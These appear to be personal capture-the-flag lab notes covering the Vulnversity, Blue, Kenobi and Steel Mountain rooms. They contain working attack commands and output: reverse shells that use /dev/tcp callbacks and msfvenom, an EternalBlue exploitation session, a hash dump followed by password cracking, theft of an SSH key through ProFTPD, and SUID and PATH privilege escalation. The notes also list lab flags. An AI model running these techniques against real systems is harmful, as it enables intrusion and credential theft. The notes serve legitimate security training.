# Offensive Pentesting

[TOC]

## Vulnversity

### Reconnaissance with `Nmap`

- `-sV`: determine the version of services running
- `-p <PORT_NUMBER>`: port scan
- `-p-`: scans for all ports
- `-p1-200`: scans for ports from 1 to 200
- `-Pn`: disable *host discovery* and scan for open ports
- `-A`: enables OS and version detection, executes in-build scripts for further enumeration

### Locating directories using `Gobuster`

- With `Gobuster`, we will locate a directory to which we can use to upload a shell
- Need a wordlist, can find many under `/usr/share/wordlists` in Kali
- `gobuster dir -u <URL> -w <WORDLIST>`
    - `dir` specifies the mode: directory and file enumeration
    - `-u <URL>` the URL of the target web server
    - `-w <WORDLIST>` specifies the wordlist path
- Other flags
    - `-U` and `-P`: specifies the username and password for authentication
    - `-p <x>`: proxy to use for requests
    - `-c <HTTP_COOKIES>`: specifies a cookie for simulating auth
- By default, `gobuster` will only search for 1 layer of directory

### Compromising the Webserver

- After finding a form to upload files, we can leverage it to upload and execute our payload
- Fuzzing the upload form to identify which extensions are not blocked with `BurpSuite`
    - Use intruder (used for automating customised attacks). To begin, make a wordlist with possible extensions

        ```
        .php
        .php3
        .php4
        .php5
        .phtml
        ```
- Then, we upload any file and intercept the request, send it to the intruder, choose `Sniper` as attack type
- In the payload, embrace the file extension (`.*`) with `§`, e.g., `file§.php§`
- Paste the extension list to payload settings, and start attack
- Take care of the `URL-encode these characters` option in "Payload encoding", and do not URL-encode the `.` character

### Getting a Reverse Shell

- Prepare a reverse PHP shell, name it as `php-reverse-shell.phtml`
- Upload this file, listen to port 1234 (`nc -lvnp 1234`), and visit `http://<TARGET_IP>:3333/internal/uploads/php-reverse-shell.phtml`, this will get the payload executed

    ```bash
    # nc -lvnp 1234
    Listening on [0.0.0.0] (family 0, port 1234)
    Connection from 10.10.39.75 47710 received!
    Linux vulnuniversity 4.4.0-142-generic #168-Ubuntu SMP Wed Jan 16 21:00:45 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux
    06:43:12 up 27 min,  0 users,  load average: 0.00, 0.04, 0.07
    USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
    uid=33(www-data) gid=33(www-data) groups=33(www-data)
    /bin/sh: 0: can't access tty; job control turned off
    $ 
    ```

### Privilege Escalation

- We got a reverse shell, but as an unprivileged user (`www-data`). We will escalate our privileges to become the root user
- Search for Set-UID files: `find / -perm /4000 -type f 2>/dev/null`
- We found Set-UID program `/bin/systemctl`, which can be used to start a service with the root privilege
- Prepare a service `escalation.service`

    ```
    [Unit]
    Description=escalator

    [Service]
    Type=simple
    User=root
    ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.35.6/9999 0>&1'

    [Install]
    WantedBy=multi-user.target
    ```
- Find a directory where we are able to write so that we can create the service file, we can use `/dev/shm`: 

    ```shell
    $ find / -maxdepth 2 -type d -writable
    /run/php
    /run/lock
    find: '/lost+found': Permission denied
    /var/tmp
    /var/crash
    /tmp
    /tmp/.font-unix
    /tmp/.ICE-unix
    /tmp/.X11-unix
    /tmp/.XIM-unix
    /tmp/.Test-unix
    /dev/mqueue
    /dev/shm
    find: '/root': Permission denied
    ```

- It is not convenient to edit file (e.g., using `vi`) in the reverse shell, we can prepare the following commands and paste them to the shell

    ```shell
    echo "[Unit]" > /dev/shm/escalation.service
    echo "Description=escalator" >> /dev/shm/escalation.service
    echo "[Service]" >> /dev/shm/escalation.service
    echo "Type=simple" >> /dev/shm/escalation.service
    echo "User=root" >> /dev/shm/escalation.service
    echo "ExecStart=/bin/bash -c 'bash -i >& /dev/tcp/10.10.35.6/22222 0>&1'" >> /dev/shm/escalation.service
    echo "[Install]" >> /dev/shm/escalation.service
    echo "WantedBy=multi-user.target" >> /dev/shm/escalation.service
    cat /dev/shm/escalation.service
    ```

- **Important**: on the attack machine, listening to port `22222` before start the service on the victim machine
- Start the service 

    ```shell
    $ /bin/systemctl enable /dev/shm/escalation.service
    Created symlink from /etc/systemd/system/multi-user.target.wants/escalation.service to /dev/shm/escalation.service.
    Created symlink from /etc/systemd/system/escalation.service to /dev/shm/escalation.service.
    $ /bin/systemctl start escalation
    ```

- On the attack machine

    ```shell
    # nc -lvnp 22222
    Listening on [0.0.0.0] (family 0, port 22222)
    Connection from 10.10.39.75 34242 received!
    bash: cannot set terminal process group (2215): Inappropriate ioctl for device
    bash: no job control in this shell
    root@vulnuniversity:/# 
    root@vulnuniversity:/# cat ~/root.txt <-- get the root flag
    ```

## Blue

### Recon with `Nmap`

- `nmap -sV -sC --script vuln -oN blue.map 10.10.92.115`
    - `-sV`: Version detection. This option tells Nmap to probe open ports to determine what service and version is running
    - `-sC`: This option runs a collection of Nmap Scripting Engine (NSE) scripts that are considered to be safe and useful for general scanning. It is equivalent to `--script=default`
    - `-script vuln`: This option specifies to run all scripts in the vuln category, which are used to check for known vulnerabilities on the target
    - `-oN blue.map`: This option tells Nmap to output the results of the scan in normal format to a file named `blue.map`

    ```shell
    Host script results:
    |_samba-vuln-cve-2012-1182: NT_STATUS_ACCESS_DENIED
    |_smb-vuln-ms10-054: false
    |_smb-vuln-ms10-061: NT_STATUS_ACCESS_DENIED
    | smb-vuln-ms17-010: 
    |   VULNERABLE:
    |   Remote Code Execution vulnerability in Microsoft SMBv1 servers (ms17-010)
    |     State: VULNERABLE
    |     IDs:  CVE:CVE-2017-0143
    |     Risk factor: HIGH
    |       A critical remote code execution vulnerability exists in Microsoft SMBv1
    |        servers (ms17-010).
    |           
    |     Disclosure date: 2017-03-14
    |     References:
    |       https://blogs.technet.microsoft.com/msrc/2017/05/12/customer-guidance-for-wannacrypt-attacks/
    |       https://technet.microsoft.com/en-us/library/security/ms17-010.aspx
    |_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2017-0143
    ```

### Gain access with `Metasploit`

- Start `Metasploit`: `# msfconsole`
- Search for the exploit for `ms17-010`:

    ```shell
    msf6 > search ms17-010

    Matching Modules
    ================

    #  Name                                      Disclosure Date  Rank     Check  Description
    -  ----                                      ---------------  ----     -----  -----------
    0  exploit/windows/smb/ms17_010_eternalblue  2017-03-14       average  Yes    MS17-010 EternalBlue SMB Remote Windows Kernel Pool Corruption
    1  exploit/windows/smb/ms17_010_psexec       2017-03-14       normal   Yes    MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Code Execution
    2  auxiliary/admin/smb/ms17_010_command      2017-03-14       normal   No     MS17-010 EternalRomance/EternalSynergy/EternalChampion SMB Remote Windows Command Execution
    3  auxiliary/scanner/smb/smb_ms17_010                         normal   No     MS17-010 SMB RCE Detection
    4  exploit/windows/smb/smb_doublepulsar_rce  2017-04-14       great    Yes    SMB DOUBLEPULSAR Remote Code Execution
    ```

- Choose exploit, and show options, set `RHOSTS`, and set the payload

    ```shell
    msf6 > use exploit/windows/smb/ms17_010_eternalblue
    [*] No payload configured, defaulting to windows/x64/meterpreter/reverse_tcp
    msf6 exploit(windows/smb/ms17_010_eternalblue) > show options
    ...
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set RHOSTS 10.10.177.201
    RHOSTS => 10.10.177.201
    msf6 exploit(windows/smb/ms17_010_eternalblue) > set payload windows/x64/shell/reverse_tcp
    payload => windows/x64/shell/reverse_tcp
    ```

- Run the exploit (and get a reverse shell):
    
    ```shell
    msf6 exploit(windows/smb/ms17_010_eternalblue) > exploit
    ...
    Shell Banner:
    Microsoft Windows [Version 6.1.7601]
    -----
            

    C:\Windows\system32>
    ```

### Escalate

- The next step is to get the root privilege
- Background the previously gained shell with `Ctrl+Z`
- Convert a shell to meterpreter shell in `Metasploit` (A *Meterpreter shell* is a powerful, dynamic, and extensible payload within the Metasploit Framework. It provides an interactive shell that allows penetration testers to execute commands on a target system with advanced features and capabilities that go beyond a traditional command shell)
    1. Load the shell to Meterpreter module: `use post/multi/manage/shell_to_meterpreter`
    2. Find the correct session, set `SESSION`, and run this module: 
        
        ```shell
        msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

        Active sessions
        ===============

        Id  Name  Type               Information                                               Connection
        --  ----  ----               -----------                                               ----------
        1         shell x64/windows  Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.10.95.106:4444 -> 10.10.177.201:49207 (10.10.177.201)

        msf6 post(multi/manage/shell_to_meterpreter) > set SESSION 1
        SESSION => 1
        msf6 post(multi/manage/shell_to_meterpreter) > run

        [*] Upgrading session ID: 1
        [*] Starting exploit/multi/handler
        [*] Started reverse TCP handler on 10.10.95.106:4433 
        [*] Post module execution completed
        msf6 post(multi/manage/shell_to_meterpreter) > 
        [*] Sending stage (200774 bytes) to 10.10.177.201
        [*] Meterpreter session 2 opened (10.10.95.106:4433 -> 10.10.177.201:49223) at 2024-07-24 12:21:27 +0100
        [*] Stopping exploit/multi/handler

        msf6 post(multi/manage/shell_to_meterpreter) >
        ```

    3. Now we have another session

        ```shell
        msf6 post(multi/manage/shell_to_meterpreter) > sessions -l

        Active sessions
        ===============

        Id  Name  Type                     Information                                               Connection
        --  ----  ----                     -----------                                               ----------
        1         shell x64/windows        Shell Banner: Microsoft Windows [Version 6.1.7601] -----  10.10.95.106:4444 -> 10.10.177.201:49207 (10.10.177.201)
        2         meterpreter x64/windows  NT AUTHORITY\SYSTEM @ JON-PC 


        ```
    
    4. Back to the DOS shell to see who I am

        ```shell
        msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 1
        [*] Starting interaction with 1...


        Shell Banner:
        Microsoft Windows [Version 6.1.7601]
        -----
                

        C:\Windows\system32>
        C:\Windows\system32>getsystem
        getsystem
        'getsystem' is not recognized as an internal or external command,
        operable program or batch file.

        C:\Windows\system32>whoami
        whoami
        nt authority\system
        ```
    
    5. Background this DOS shell again, and select the meterpreter session (`SESSION=2`)

        ```shell
        msf6 post(multi/manage/shell_to_meterpreter) > sessions -i 2
        [*] Starting interaction with 2...

        meterpreter > ps

        Process List
        ============

        PID   PPID  Name                  Arch  Session  User                          Path
        ---   ----  ----                  ----  -------  ----                          ----
        0     0     [System Process]
        4     0     System                x64   0
        352   556   conhost.exe           x64   0        NT AUTHORITY\SYSTEM 
        ...
        ```
    
    6. Migrate a process that is running at `NT AUTHORITY\SYSTEM`, this process might not be stable. (The `migrate` command in a Meterpreter session allows you to move the current Meterpreter session from one process to another on the target system. This is particularly useful for maintaining persistence, avoiding detection, and ensuring stability of the session). This will take several attempts, and if it fails, we will need to re-run the conversion process or reboot the machine (and try a different process)

        ```shell
        meterpreter > migrate 1288
        [*] Migrating from 1904 to 1288...
        [*] Migration completed successfully.
        ```

### Cracking

- Run `hashdump` in the Meterpreter. This will dump all of the passwords on the machine

    ```shell
    meterpreter > hashdump
    Administrator:500:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Guest:501:aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0:::
    Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::
    ```
- Save `Jon:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::` in a file (e.g., `hash.txt`), and use some password cracking tool to get the password. Use `john`. The plaintext is `alqfna22`

    ```shell
    root@ip-10-10-95-106:~# john hash.txt --format=NT --wordlist=/usr/share/wordlists/rockyou.txt
    Using default input encoding: UTF-8
    Loaded 1 password hash (NT [MD4 256/256 AVX2 8x3])
    Warning: no OpenMP support for this hash type, consider --fork=2
    Press 'q' or Ctrl-C to abort, almost any other key for status
    alqfna22         (Jon)
    1g 0:00:00:06 DONE (2024-07-24 13:03) 0.1455g/s 1484Kp/s 1484Kc/s 1484KC/s alr1979..alpus
    Use the "--show --format=NT" options to display all of the cracked passwords reliably
    Session completed. 
    root@ip-10-10-95-106:~# john hash.txt --format=NT --show
    Jon:alqfna22:1000:aad3b435b51404eeaad3b435b51404ee:ffb43f0de35be4d9917ac0cc8ad57f8d:::

    1 password hash cracked, 0 left
    ```

### Find flags!

- Find 3 flags planted at 3 key locations within the Windows system
- Flag 1: `C:\flag1.txt` (at the system root)
- Flag 2: `C:\Windows\System32\config\flag2.txt` (the location where passwords are stored within Windows)
- Flag 3: `C:\Users\Jon\Documents\flag3.txt` (a location where administrators usually have pretty interesting things saved), in this target machine, `Jon` is the administrator, we can verify this using `net localgroup Administrators`

    ```shell
    C:\Users\Jon\Documents>net localgroup Administrators
    net localgroup Administrators
    Alias name     Administrators
    Comment        Administrators have complete and unrestricted access to the computer/domain

    Members

    -------------------------------------------------------------------------------
    Administrator
    Jon
    The command completed successfully.
    ```

## Kenobi

- Exploiting a Linux machine, accessing a Samba share, manipulating a vulnerable version of ProFTPD to gain initial access and escalate your privileges to root via an SUID binary
    - **Samba** is the standard Windows interoperability suite of programs for Linux and Unix. It allows end users to access and use files, printers and other commonly shared resources on a companies intranet or internet. Its often referred to as a network file system. Samba is based on the common client/server protocol of Server Message Block (SMB). SMB is developed only for Windows, without Samba, other computer platforms would be isolated from Windows machines, even if they were part of the same network
    - **ProFtpd (Pro FTP Daemon)** is a free and open-source FTP server, compatible with Unix and Windows systems. Its also been vulnerable in the past software versions

### Enumerating Samba for shares

- SMB has two ports, `445` and `139`, SMB after Windows 2000 uses port `445` on top of a TCP stack. Using TCP allows SMB to work over the Internet

    ```shell
    # nmap -p 445 --script=smb-enum-shares.nse,smb-enum-users.nse 10.10.180.135

    Starting Nmap 7.60 ( https://nmap.org ) at 2024-07-25 05:24 BST
    Nmap scan report for ip-10-10-180-135.eu-west-1.compute.internal (10.10.180.135)
    Host is up (0.00012s latency).

    PORT    STATE SERVICE
    445/tcp open  microsoft-ds
    MAC Address: 02:3F:3A:2E:19:31 (Unknown)

    Host script results:
    | smb-enum-shares: 
    |   account_used: guest
    |   \\10.10.180.135\IPC$: 
    |     Type: STYPE_IPC_HIDDEN
    |     Comment: IPC Service (kenobi server (Samba, Ubuntu))
    |     Users: 2
    |     Max Users: <unlimited>
    |     Path: C:\tmp
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.180.135\anonymous: 
    |     Type: STYPE_DISKTREE
    |     Comment: 
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\home\kenobi\share
    |     Anonymous access: READ/WRITE
    |     Current user access: READ/WRITE
    |   \\10.10.180.135\print$: 
    |     Type: STYPE_DISKTREE
    |     Comment: Printer Drivers
    |     Users: 0
    |     Max Users: <unlimited>
    |     Path: C:\var\lib\samba\printers
    |     Anonymous access: <none>
    |_    Current user access: <none>
    ```

- Inspect one of the shares

    ```shell
    # smbclient //10.10.180.135/anonymous
    WARNING: The "syslog" option is deprecated
    Enter WORKGROUP\root's password: 
    Try "help" to get a list of possible commands.
    smb: \> ls
    .                                   D        0  Wed Sep  4 11:49:09 2019
    ..                                  D        0  Wed Sep  4 11:56:07 2019
    log.txt                             N    12237  Wed Sep  4 11:49:09 2019

            9204224 blocks of size 1024. 6877120 blocks available
    ```

- We can recursively download the SMB share (no password, press `Enter`): `smbget -R smb://10.10.180.135/anonymous`. We can find the FTP port in `log.txt`

    ```
    ...
    ServerName			"ProFTPD Default Installation"
    ServerType			standalone
    DefaultServer			on

    # Port 21 is the standard FTP port.
    Port				21

    # Don't use IPv6 support by default.
    UseIPv6				off
    ...
    ```

- By port scanning, we can know that port `111` is running `rpcbind` service. When an RPC service is started, it tells `rpcbind` the address at which it is listening and the RPC program number it is prepared to serve
- In our case, port `111` is access to a network file system. Use `nmap` to enumerate this

    ```shell
    # nmap -p 111 --script=nfs-ls,nfs-statfs,nfs-showmount 10.10.115.178
    ...
    PORT    STATE SERVICE
    111/tcp open  rpcbind
    | nfs-ls: Volume /var
    |   access: Read Lookup NoModify NoExtend NoDelete NoExecute
    | PERMISSION  UID  GID  SIZE  TIME                 FILENAME
    | rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  .
    | rwxr-xr-x   0    0    4096  2019-09-04T12:27:33  ..
    | rwxr-xr-x   0    0    4096  2019-09-04T12:09:49  backups
    | rwxr-xr-x   0    0    4096  2019-09-04T10:37:44  cache
    | rwxrwxrwt   0    0    4096  2019-09-04T08:43:56  crash
    | rwxrwsr-x   0    50   4096  2016-04-12T20:14:23  local
    | rwxrwxrwx   0    0    9     2019-09-04T08:41:33  lock
    | rwxrwxr-x   0    108  4096  2019-09-04T10:37:44  log
    | rwxr-xr-x   0    0    4096  2019-01-29T23:27:41  snap
    | rwxr-xr-x   0    0    4096  2019-09-04T08:53:24  www
    |_
    | nfs-showmount: 
    |_  /var *
    | nfs-statfs: 
    |   Filesystem  1K-blocks  Used       Available  Use%  Maxfilesize  Maxlink
    |_  /var        9204224.0  1836516.0  6877112.0  22%   16.0T        32000
    MAC Address: 02:A8:AF:4A:EC:A7 (Unknown)
    ...
    ```

### Get initial access with ProFTPD

- Use `netcat` to connect to the machine on the FTP port: `nc 10.10.115.178 21` (We got this port number from `log.txt` downloaded by `smbget` command)
- We can use `Searchsploit`, a command line search tool for `exploit-db.com`, to find exploits for a particular software version

    ```shell
    # searchsploit proftpd 1.3.5
    ---------------------------------------------- ---------------------------------
    Exploit Title                                |  Path
    ---------------------------------------------- ---------------------------------
    ProFTPd 1.3.5 - 'mod_copy' Command Execution  | linux/remote/37262.rb
    ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/36803.py
    ProFTPd 1.3.5 - 'mod_copy' Remote Command Exe | linux/remote/49908.py
    ProFTPd 1.3.5 - File Copy                     | linux/remote/36742.txt
    ---------------------------------------------- ---------------------------------
    Shellcodes: No Results
    ```


- ProFtpd's `mod_copy` module implements `SITE CPFR` and `SITE CPTO` commands, which can be used to copy files/directories from one place to another on the server. Any unauthenticated client can leverage these commands to copy files from any part of the filesystem to a chosen destination
- We know that the FTP service is running as the Kenobi user (from the file on the share) and an ssh key is generated for that user. We can copy Kenobi's private key using `SITE CPFR` and `SITE CPTO`

    ```shell
    # nc 10.10.115.178 21
    220 ProFTPD 1.3.5 Server (ProFTPD Default Installation) [10.10.115.178]
    SITE CPFR /home/kenobi/.ssh/id_rsa
    350 File or directory exists, ready for destination name
    SITE CPTO /var/tmp/id_rsa
    250 Copy successful
    ```

- `/var` is a mount that we can see. Mount `/var` to our machine `/target_var`

    ```shell
    # mkdir /target_var
    # mount 10.10.115.178:/var /target_var
    root@ip-10-10-165-226:~# ls -l /target_var
    total 48
    drwxr-xr-x  2 root root  4096 Sep  4  2019 backups
    drwxr-xr-x  9 root root  4096 Sep  4  2019 cache
    drwxrwxrwt  2 root root  4096 Sep  4  2019 crash
    drwxr-xr-x 40 root root  4096 Sep  4  2019 lib
    drwxrwsr-x  2 root staff 4096 Apr 12  2016 local
    lrwxrwxrwx  1 root root     9 Sep  4  2019 lock -> /run/lock
    drwxrwxr-x 10 root lxd   4096 Sep  4  2019 log
    drwxrwsr-x  2 root mail  4096 Feb 26  2019 mail
    drwxr-xr-x  2 root root  4096 Feb 26  2019 opt
    lrwxrwxrwx  1 root root     4 Sep  4  2019 run -> /run
    drwxr-xr-x  2 root root  4096 Jan 29  2019 snap
    drwxr-xr-x  5 root root  4096 Sep  4  2019 spool
    drwxrwxrwt  6 root root  4096 Jul 25 11:43 tmp
    drwxr-xr-x  3 root root  4096 Sep  4  2019 www
    ```

- With the private key, we can `ssh` login to `kenobi@10.10.115.178`, and see the user flag. We need to set the permission of `id_rsa` to `600` (not readable to other users)

    ```shell
    # cp /target_var/tmp/id_rsa .
    # chmod 600 id_rsa
    root@ip-10-10-165-226:~# ssh -i id_rsa kenobi@10.10.115.178
    Welcome to Ubuntu 16.04.6 LTS (GNU/Linux 4.8.0-58-generic x86_64)

    * Documentation:  https://help.ubuntu.com
    * Management:     https://landscape.canonical.com
    * Support:        https://ubuntu.com/advantage

    103 packages can be updated.
    65 updates are security updates.


    Last login: Wed Sep  4 07:10:15 2019 from 192.168.1.147
    To run a command as administrator (user "root"), use "sudo <command>".
    See "man sudo_root" for details.

    kenobi@kenobi:~$ cat ~/user.txt 
    d0b0f3f53b6caa532a83915e19224899
    ```

### Privilege Escalation with Path Variable Manipulation

- We can use a Set-UID root program to escalate privilege. To find one, use `find / -perm -u=s -type f 2>/dev/null`

    ```shell
    $ find / -perm -u=s -type f 2>/dev/null
    /sbin/mount.nfs
    /usr/lib/policykit-1/polkit-agent-helper-1
    /usr/lib/dbus-1.0/dbus-daemon-launch-helper
    /usr/lib/snapd/snap-confine
    /usr/lib/eject/dmcrypt-get-device
    /usr/lib/openssh/ssh-keysign
    /usr/lib/x86_64-linux-gnu/lxc/lxc-user-nic
    /usr/bin/chfn
    /usr/bin/newgidmap
    /usr/bin/pkexec
    /usr/bin/passwd
    /usr/bin/newuidmap
    /usr/bin/gpasswd
    /usr/bin/menu
    /usr/bin/sudo
    /usr/bin/chsh
    /usr/bin/at
    /usr/bin/newgrp
    /bin/umount
    /bin/fusermount
    /bin/mount
    /bin/ping
    /bin/su
    /bin/ping6
    ```

- Use `/usr/bin/menu`

    ```shell
    $ /usr/bin/menu

    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :
    ```

- Use `strings` command to search for human redable strings on a binary. We can know that inside this binary, it runs some commands without using their absolute path. If we manipulate the PATH environment variable, we can get `/usr/bin/menu` to execute any programs on the system

    ```shell
    $ strings /usr/bin/menu
    ...
    curl -I localhost
    uname -r
    ifconfig
    ...
    ```

- Escalation (in some newer versions of Linux, all shell programs, e.g., `bash`, `zsh`, etc., have a countermeasure that drops root privilege when executed by a Set-UID root program)

    ```shell
    kenobi@kenobi:~$ echo /bin/sh > curl
    kenobi@kenobi:~$ chmod 777 curl
    kenobi@kenobi:~$ export PATH=/home/kenobi:$PATH
    kenobi@kenobi:~$ /usr/bin/menu

    ***************************************
    1. status check
    2. kernel version
    3. ifconfig
    ** Enter your choice :1
    # whoami
    root
    # cat /root/root.txt
    177b3cd8562289f37382721c28381f02
    ```

## Steel Mountain

- Hack into a Mr. Robot themed Windows machine. Use metasploit for initial access, utilise powershell for Windows privilege escalation enumeration and learn a new technique to get Administrator access
- First, `nmap -Pn 10.10.129.248`, and we can find that there is a website on port `80`. Open it, we can see a photo of the emploee of the month. Open that picture, and we can see his name (`Bill Harper`) in the URL

## Initial Access

- Ports opened

    ```
    PORT      STATE SERVICE
    80/tcp    open  http
    135/tcp   open  msrpc
    139/tcp   open  netbios-ssn
    445/tcp   open  microsoft-ds
    3389/tcp  open  ms-wbt-server
    8080/tcp  open  http-proxy
    49152/tcp open  unknown
    49153/tcp open  unknown
    49154/tcp open  unknown
    49155/tcp open  unknown
    49156/tcp open  unknown
    ```

- Get more information about the web server on `8080`: `nmap -sV -p 8080 10.10.129.248`. If we visit the website, we can know it is running Rejetto HTTP File Server

    ```
    PORT     STATE SERVICE VERSION
    8080/tcp open  http    HttpFileServer httpd 2.3
    ```

- Use `searchsploit` to find exploits for Rejetto HTTP File Server 2.3. But this will not display the CVE number. We can get this information by visiting [www.exploit-db.com](www.exploit-db.com), one exploit is CVE-2014-6287

    ```shell
    # searchsploit Rejetto HTTP File Server 2.3
    ---------------------------------------------- ---------------------------------
    Exploit Title                                |  Path
    ---------------------------------------------- ---------------------------------
    Rejetto HTTP File Server (HFS) - Remote Comma | windows/remote/34926.rb
    Rejetto HTTP File Server (HFS) 2.2/2.3 - Arbi | multiple/remote/30850.txt
    Rejetto HTTP File Server (HFS) 2.3.x - Remote | windows/remote/34668.txt
    Rejetto HTTP File Server (HFS) 2.3.x - Remote | windows/remote/39161.py
    Rejetto HTTP File Server (HFS) 2.3a/2.3b/2.3c | windows/webapps/34852.txt
    Rejetto HttpFileServer 2.3.x - Remote Command | windows/webapps/49125.py
    ---------------------------------------------- ---------------------------------
    Shellcodes: No Results
    ```

- Use `Metasploit` to search for this exploit, and use it to get initial access

    ```shell
    msf6 > search cve-2014-6287

    Matching Modules
    ================

    #  Name                                   Disclosure Date  Rank       Check  Description
    -  ----                                   ---------------  ----       -----  -----------
    0  exploit/windows/http/rejetto_hfs_exec  2014-09-11       excellent  Yes    Rejetto HttpFileServer Remote Command Execution
    ...
    msf6 > use exploit/windows/http/rejetto_hfs_exec
    [*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
    msf6 exploit(windows/http/rejetto_hfs_exec) > set RHOSTS 10.10.135.22
    RHOSTS=>10.10.135.22
    msf6 exploit(windows/http/rejetto_hfs_exec) > set RPORT 8080
    RPORT=>8080
    msf6 exploit(windows/http/rejetto_hfs_exec) > exploit

    [*] Started reverse TCP handler on 10.10.41.201:4444 
    [*] Using URL: http://10.10.41.201:8080/EbCNZVqdIQTx5I
    [*] Server started.
    [*] Sending a malicious request to /
    [*] Payload request received: /EbCNZVqdIQTx5I
    [*] Sending stage (175686 bytes) to 10.10.135.22
    [!] Tried to delete %TEMP%\XyImyWV.vbs, unknown result
    [*] Meterpreter session 1 opened (10.10.41.201:4444 -> 10.10.135.22:49227) at 2024-07-26 11:20:34 +0100
    [*] Server stopped.

    meterpreter > cat /Users/bill/Desktop/user.txt
    b04763b6fcf51fcd7c13abc7db4fd365
    ```

## Privilege Escalation

- To enumerate this machine, we will use a powershell script called *PowerUp*, its purpose is to evaluate a Windows machine and determine any abnormalities - *"PowerUp aims to be a clearinghouse of common Windows privilege escalation vectors that rely on misconfigurations."*
- Upload `PowerUp.ps1`, run it

    ```shell
    meterpreter > upload /root/PowerUp.ps1
    [*] Uploading  : /root/PowerUp.ps1 -> PowerUp.ps1
    [*] Uploaded 586.50 KiB of 586.50 KiB (100.0%): /root/PowerUp.ps1 -> PowerUp.ps1
    [*] Completed  : /root/PowerUp.ps1 -> PowerUp.ps1
    meterpreter > load powershell
    Loading extension powershell...Success.
    meterpreter > powershell_shell
    PS > . .\PowerUp.ps1
    PS > Invoke-AllChecks
    ...
    ServiceName    : AdvancedSystemCareService9
    Path           : C:\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
    ModifiablePath : @{ModifiablePath=C:\; IdentityReference=BUILTIN\Users; Permissions=AppendData/AddSubdirectory}
    StartName      : LocalSystem
    AbuseFunction  : Write-ServiceBinary -Name 'AdvancedSystemCareService9' -Path <HijackPath>
    CanRestart     : True
    Name           : AdvancedSystemCareService9
    Check          : Unquoted Service Paths
    ...
    ```

- The service `AdvancedSystemCareService9`'s `CanRestart` option is true, and shows up an *unquoted service paths* vulnerability. We can replace the legitimate application with our malicious one, restart the service, which will run our infected program
    - The *Unquoted Service Paths* vulnerability is a security issue in Windows operating systems where the path to a service executable is not properly enclosed in quotes. This can lead to privilege escalation attacks. When the service path is unquoted and contains spaces, the Windows service manager may misinterpret the path and attempt to execute unintended executables with elevated privileges
- Use msfvenom to generate a reverse shell as an Windows executable: `msfvenom -p windows/shell_reverse_tcp LHOST=10.10.41.201 LPORT=4443 -e x86/shikata_ga_nai -f exe-service -o Advanced.exe`, and upload it
    - `-p`: payload
    - `-e`: encoding
    - `-f`: file-type
    - `-o`: output filename

- Exploit (stop the `AdvancedSystemCareService9` service, replace the program, and start the service again, this will get `Advanced.exe` to be executed)

    ```shell
    meterpreter > shell
    Process 1300 created.
    Channel 8 created.
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.

    C:\Users\bill\Desktop>sc stop AdvancedSystemCareService9
    sc stop AdvancedSystemCareService9

    SERVICE_NAME: AdvancedSystemCareService9 
            TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
            STATE              : 4  RUNNING 
                                    (STOPPABLE, PAUSABLE, ACCEPTS_SHUTDOWN)
            WIN32_EXIT_CODE    : 0  (0x0)
            SERVICE_EXIT_CODE  : 0  (0x0)
            CHECKPOINT         : 0x0
            WAIT_HINT          : 0x0

    C:\Users\bill\Desktop>sc stop AdvancedSystemCareService9
    sc stop AdvancedSystemCareService9
    [SC] ControlService FAILED 1062:

    The service has not been started.


    C:\Users\bill\Desktop>^C
    Terminate channel 8? [y/N]  y
    meterpreter > upload Advanced.exe "\Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe"
    [*] Uploading  : /root/Advanced.exe -> \Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
    [*] Uploaded 15.50 KiB of 15.50 KiB (100.0%): /root/Advanced.exe -> \Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
    [*] Completed  : /root/Advanced.exe -> \Program Files (x86)\IObit\Advanced SystemCare\ASCService.exe
    meterpreter > shell
    Process 2012 created.
    Channel 10 created.
    Microsoft Windows [Version 6.3.9600]
    (c) 2013 Microsoft Corporation. All rights reserved.

    C:\Users\bill\Desktop>sc start AdvancedSystemCareService9
    sc start AdvancedSystemCareService9

    SERVICE_NAME: AdvancedSystemCareService9 
            TYPE               : 110  WIN32_OWN_PROCESS  (interactive)
            STATE              : 2  START_PENDING 
                                    (NOT_STOPPABLE, NOT_PAUSABLE, IGNORES_SHUTDOWN)
            WIN32_EXIT_CODE    : 0  (0x0)
            SERVICE_EXIT_CODE  : 0  (0x0)
            CHECKPOINT         : 0x0
            WAIT_HINT          : 0x7d0
            PID                : 792
            FLAGS              : 

    ```

- Before `sc start AdvancedSystemCareService9`, open another terminal on the attack machine, listen to port `4443`

    ```shell
    # nc -lvnp 4443
    ...
    C:\Windows\system32> whoami
    whoami
    nt authority\system

    C:\Windows\system32> cd ../../Users/Administrator/Desktop
    cd ../../Users/Administrator/Desktop

    C:\Users\Administrator\Desktop>type root.txt
    type root.txt
    9af5f314f57607c00fd09803a587db80
    ```

## Access and Escalation Without Metasploit

